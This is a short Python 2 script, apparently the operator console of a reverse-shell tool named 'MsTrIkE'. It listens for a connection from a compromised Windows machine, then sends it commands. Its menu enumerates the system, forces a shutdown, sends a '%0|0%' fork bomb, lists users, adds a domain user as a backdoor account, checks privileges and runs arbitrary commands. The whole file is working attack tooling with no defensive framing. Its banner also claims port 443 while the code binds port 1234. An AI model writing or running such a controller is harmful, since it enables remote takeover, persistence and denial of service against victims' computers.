import socket
from pyfiglet import Figlet
import subprocess



def banner():
    f = Figlet(font='slant')
    print f.renderText('Welcome To MsTrIkE')


def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.bind(("127.0.0.1", 1234))

    s.listen(1)

    banner()
    print '''
             [+]Port:443
             [+]Waiting for shell
          '''


    conn, addr = s.accept()

    print '[+] We got a connection from: ', addr


    while True:

        command = raw_input("MsTrIkE> ")

        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break

        elif 'exit' in command:
            break


        elif 'help' in command:
            print '''
                  [H]============MsTrIkE========[-][o][x]
                  |                                      |
                  |[enum]:  Enumeration                  |
                  |[shutdown]: Close to machine          |
                  |[bomb]: Block system                  |
                  |[users]: users name                   |
                  |[newuser] : new user                  |
                  |[priv]: View privileges
                  '''

        elif 'clear' in command:
            subprocess.call('clear', shell=True)


        elif 'enum' in command:
            conn.send('systeminfo')
            print conn.recv(1024)

        elif 'shutdown' in command:
            conn.send('shutdown -s -t 10')
            print conn.recv(1024)

        elif 'bomb' in command:
            conn.send('%0|0%')
            print conn.recv(1024)

        elif 'users' in command:
            conn.send('net users')
            print conn.recv(1024)

        elif 'newuser' in command:
            username = raw_input('Username:')
            password = raw_input('password')
            add = 'net user'+' '+username+' '+password+' '+'/add'+' '+'/DOMAIN'
            conn.send(add)
            print(add)
            print conn.recv(1024)

        elif 'priv' in command:
            conn.send('whoami /priv')
            print conn.recv(1024)

        else:
            conn.send(command)
            print conn.recv(1024)




def main ():
	connect()

main()
